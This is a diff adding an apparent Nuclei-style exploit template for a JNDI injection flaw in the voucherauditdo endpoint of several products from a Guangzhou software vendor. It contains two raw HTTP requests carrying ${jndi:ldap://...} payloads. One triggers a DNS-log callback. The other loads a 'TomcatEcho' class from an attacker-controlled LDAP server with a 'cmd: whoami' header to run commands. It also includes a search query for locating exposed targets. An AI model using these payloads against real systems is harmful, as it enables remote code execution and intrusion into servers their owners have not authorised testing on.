@@ -1,0 +1,72 @@
+id: poc-1eb635aab9deeb0b46b2
+info:
+  name: 速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1eb635aab9deeb0b46b281009ccc0e30
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1eb635aab9deeb0b46b281009ccc0e30
+    fofa: + hunter`web.body="速达软件技术（广州）有限公司"`
+http:
+- raw:
+  - 'GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://g58b0k.dnslog.cn} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    cmd: whoami
+
+    Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    cmd: whoami
+
+    Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
